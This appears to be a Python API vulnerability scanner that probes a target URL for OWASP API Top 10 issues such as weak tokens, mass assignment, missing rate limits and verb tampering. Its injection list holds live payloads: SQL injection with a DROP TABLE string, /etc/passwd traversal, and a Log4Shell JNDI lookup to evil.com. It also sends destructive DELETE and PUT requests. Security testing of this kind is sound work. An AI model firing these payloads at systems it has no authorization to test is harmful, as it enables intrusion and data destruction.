#!/usr/bin/env python3
"""
API Vulnerability Scanner
Tests for OWASP API Security Top 10 vulnerabilities
"""

import requests
import json
import urllib.parse
from datetime import datetime
import re
import time

class APIScanner:
    """API vulnerability scanner"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

    def scan(self):
        """Run comprehensive API scan"""
        print(f"[*] Starting API security scan on {self.target_url}")

        # Test for various API vulnerabilities
        self._test_broken_authentication()
        self._test_excessive_data_exposure()
        self._test_lack_of_rate_limiting()
        self._test_mass_assignment()
        self._test_security_misconfiguration()
        self._test_injection_flaws()
        self._test_improper_assets_management()
        self._test_http_verb_tampering()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_broken_authentication(self):
        """Test for broken authentication"""
        print("[*] Testing for broken authentication...")

        # Test 1: No authentication required
        try:
            response = self.session.get(self.target_url, timeout=10)

            # Check if API returns data without auth
            if response.status_code == 200 and len(response.text) > 100:
                # Look for sensitive data patterns
                if self._has_sensitive_api_data(response.text):
                    vuln = {
                        'type': 'Broken Authentication',
                        'severity': 'critical',
                        'url': self.target_url,
                        'evidence': 'API returns sensitive data without authentication',
                        'cwe': 'CWE-287',
                        'owasp_api': 'API1:2023 Broken Object Level Authorization'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Broken authentication found!")

        except Exception as e:
            pass

        # Test 2: Weak authentication tokens
        weak_tokens = ['test', 'admin', '123456', 'Bearer test', 'Bearer 123']
        for token in weak_tokens:
            headers = {'Authorization': token}
            try:
                response = self.session.get(self.target_url, headers=headers, timeout=10)
                if response.status_code == 200 and 'unauthorized' not in response.text.lower():
                    vuln = {
                        'type': 'Broken Authentication',
                        'severity': 'high',
                        'url': self.target_url,
                        'evidence': f'Weak token accepted: {token}',
                        'cwe': 'CWE-287'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Weak authentication token accepted!")
                    break
            except:
                pass

    def _test_excessive_data_exposure(self):
        """Test for excessive data exposure"""
        print("[*] Testing for excessive data exposure...")

        try:
            response = self.session.get(self.target_url, timeout=10)

            if response.status_code == 200:
                try:
                    data = response.json()

                    # Check for sensitive fields
                    sensitive_fields = [
                        'password', 'secret', 'api_key', 'private_key',
                        'ssn', 'credit_card', 'cvv', 'pin', 'token',
                        'session_id', 'access_token', 'refresh_token'
                    ]

                    exposed_fields = []
                    self._find_sensitive_fields(data, sensitive_fields, exposed_fields)

                    if exposed_fields:
                        vuln = {
                            'type': 'Excessive Data Exposure',
                            'severity': 'high',
                            'url': self.target_url,
                            'evidence': f'Sensitive fields exposed: {", ".join(exposed_fields)}',
                            'cwe': 'CWE-200',
                            'owasp_api': 'API3:2023 Broken Object Property Level Authorization'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] Excessive data exposure found!")

                except json.JSONDecodeError:
                    pass

        except Exception as e:
            pass

    def _test_lack_of_rate_limiting(self):
        """Test for lack of rate limiting"""
        print("[*] Testing for rate limiting...")

        request_count = 0
        start_time = time.time()

        try:
            # Send rapid requests
            for i in range(50):
                response = self.session.get(self.target_url, timeout=5)
                request_count += 1

                if response.status_code == 429:  # Too Many Requests
                    print(f"[+] Rate limiting is in place (blocked after {request_count} requests)")
                    return

            elapsed = time.time() - start_time

            # If we made 50 requests without rate limiting
            if request_count >= 50:
                vuln = {
                    'type': 'Lack of Rate Limiting',
                    'severity': 'medium',
                    'url': self.target_url,
                    'evidence': f'Made {request_count} requests in {elapsed:.2f}s without rate limiting',
                    'cwe': 'CWE-770',
                    'owasp_api': 'API4:2023 Unrestricted Resource Consumption'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] No rate limiting detected!")

        except Exception as e:
            pass

    def _test_mass_assignment(self):
        """Test for mass assignment vulnerabilities"""
        print("[*] Testing for mass assignment...")

        # Try adding extra fields
        test_payloads = [
            {'role': 'admin', 'is_admin': True, 'admin': True},
            {'role': 'administrator', 'privilege': 'admin'},
            {'isAdmin': True, 'isActive': True},
            {'permissions': ['admin', 'write', 'delete']},
            {'access_level': 9999, 'user_type': 'admin'}
        ]

        for payload in test_payloads:
            try:
                # Try POST
                response = self.session.post(
                    self.target_url,
                    json=payload,
                    timeout=10
                )

                if response.status_code in [200, 201]:
                    # Check if our fields were accepted
                    try:
                        resp_data = response.json()
                        for key in payload.keys():
                            if key in str(resp_data).lower():
                                vuln = {
                                    'type': 'Mass Assignment',
                                    'severity': 'high',
                                    'url': self.target_url,
                                    'payload': payload,
                                    'evidence': f'Arbitrary field "{key}" was accepted',
                                    'cwe': 'CWE-915',
                                    'owasp_api': 'API6:2023 Unrestricted Access to Sensitive Business Flows'
                                }
                                self.vulnerabilities.append(vuln)
                                print(f"[!] Mass assignment vulnerability found!")
                                return
                    except:
                        pass

                # Try PUT
                response = self.session.put(
                    self.target_url,
                    json=payload,
                    timeout=10
                )

                if response.status_code in [200, 201, 204]:
                    vuln = {
                        'type': 'Mass Assignment',
                        'severity': 'medium',
                        'url': self.target_url,
                        'payload': payload,
                        'evidence': 'PUT request with extra fields accepted',
                        'cwe': 'CWE-915'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Possible mass assignment via PUT!")
                    return

            except Exception as e:
                pass

    def _test_security_misconfiguration(self):
        """Test for security misconfigurations"""
        print("[*] Testing for security misconfigurations...")

        try:
            response = self.session.get(self.target_url, timeout=10)

            issues = []

            # Check security headers
            security_headers = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
                'Strict-Transport-Security': 'max-age',
                'Content-Security-Policy': 'default-src'
            }

            for header, expected in security_headers.items():
                if header not in response.headers:
                    issues.append(f"Missing security header: {header}")

            # Check for verbose error messages
            if 'stack trace' in response.text.lower() or 'traceback' in response.text.lower():
                issues.append("Verbose error messages expose stack traces")

            # Check for exposed API version
            if re.search(r'/v\d+/', self.target_url) or 'version' in response.headers:
                issues.append("API version exposed in URL or headers")

            # Check CORS
            cors_origin = response.headers.get('Access-Control-Allow-Origin', '')
            if cors_origin == '*':
                issues.append("Permissive CORS policy (wildcard origin)")

            if issues:
                vuln = {
                    'type': 'Security Misconfiguration',
                    'severity': 'medium',
                    'url': self.target_url,
                    'evidence': issues,
                    'cwe': 'CWE-16',
                    'owasp_api': 'API8:2023 Security Misconfiguration'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Security misconfigurations found!")

        except Exception as e:
            pass

    def _test_injection_flaws(self):
        """Test for injection flaws in API"""
        print("[*] Testing for injection flaws...")

        injection_payloads = [
            "' OR '1'='1",
            "1'; DROP TABLE users--",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<script>alert(1)</script>"
        ]

        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            params = {'id': ['1'], 'q': ['test']}

        for param_name in params.keys():
            for payload in injection_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]

                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

                try:
                    response = self.session.get(test_url, timeout=10)

                    # Check for SQL errors
                    sql_errors = ['sql syntax', 'mysql', 'postgresql', 'sqlite', 'oracle error']
                    for error in sql_errors:
                        if error in response.text.lower():
                            vuln = {
                                'type': 'SQL Injection in API',
                                'severity': 'critical',
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': 'SQL error message detected',
                                'cwe': 'CWE-89'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] SQL injection vulnerability in API!")
                            return

                    # Check for path traversal
                    if 'root:' in response.text or '/etc/passwd' in response.text:
                        vuln = {
                            'type': 'Path Traversal in API',
                            'severity': 'critical',
                            'url': test_url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': 'File system access detected',
                            'cwe': 'CWE-22'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] Path traversal vulnerability!")
                        return

                except Exception as e:
                    pass

    def _test_improper_assets_management(self):
        """Test for improper assets management"""
        print("[*] Testing for improper assets management...")

        # Test old API versions
        old_versions = ['/v1/', '/v2/', '/api/v1/', '/api/v2/', '/api/old/', '/api/deprecated/']

        base_url = self.target_url.split('/api')[0] if '/api' in self.target_url else self.target_url

        for version in old_versions:
            test_url = base_url + version

            try:
                response = self.session.get(test_url, timeout=10)

                if response.status_code == 200:
                    vuln = {
                        'type': 'Improper Assets Management',
                        'severity': 'medium',
                        'url': test_url,
                        'evidence': f'Old API version accessible: {version}',
                        'cwe': 'CWE-1059',
                        'owasp_api': 'API9:2023 Improper Inventory Management'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Old API version found: {test_url}")

            except Exception as e:
                pass

    def _test_http_verb_tampering(self):
        """Test HTTP verb tampering"""
        print("[*] Testing HTTP verb tampering...")

        verbs = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']
        results = {}

        for verb in verbs:
            try:
                response = self.session.request(verb, self.target_url, timeout=10)
                results[verb] = response.status_code

                # If dangerous methods are allowed
                if verb in ['DELETE', 'TRACE'] and response.status_code in [200, 204]:
                    vuln = {
                        'type': 'HTTP Verb Tampering',
                        'severity': 'high',
                        'url': self.target_url,
                        'evidence': f'Dangerous HTTP method {verb} allowed',
                        'method': verb,
                        'status_code': response.status_code,
                        'cwe': 'CWE-749'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Dangerous HTTP method allowed: {verb}")

            except Exception as e:
                pass

    def _has_sensitive_api_data(self, text):
        """Check if response contains sensitive API data"""
        sensitive_patterns = [
            r'"email"\s*:\s*"[^"]+@',
            r'"phone"\s*:\s*"[\d\-\+]+',
            r'"ssn"\s*:\s*"\d{3}-\d{2}-\d{4}',
            r'"credit_card"\s*:\s*"\d{4}',
            r'"api_key"\s*:\s*"[a-zA-Z0-9]{20,}',
            r'"token"\s*:\s*"[a-zA-Z0-9]{20,}',
            r'"password"\s*:\s*"[^"]+'
        ]

        for pattern in sensitive_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False

    def _find_sensitive_fields(self, data, sensitive_fields, exposed_fields, prefix=''):
        """Recursively find sensitive fields in JSON"""
        if isinstance(data, dict):
            for key, value in data.items():
                full_key = f"{prefix}.{key}" if prefix else key

                # Check if key contains sensitive terms
                for sensitive in sensitive_fields:
                    if sensitive in key.lower():
                        exposed_fields.append(full_key)
                        break

                # Recurse
                self._find_sensitive_fields(value, sensitive_fields, exposed_fields, full_key)

        elif isinstance(data, list):
            for i, item in enumerate(data):
                self._find_sensitive_fields(item, sensitive_fields, exposed_fields, f"{prefix}[{i}]")

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high'),
                'medium': sum(1 for v in self.vulnerabilities if v['severity'] == 'medium'),
                'low': sum(1 for v in self.vulnerabilities if v['severity'] == 'low')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 api_scanner.py <api_url>")
        sys.exit(1)

    scanner = APIScanner(sys.argv[1])
    results = scanner.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Vulnerabilities found: {len(results['vulnerabilities'])}")
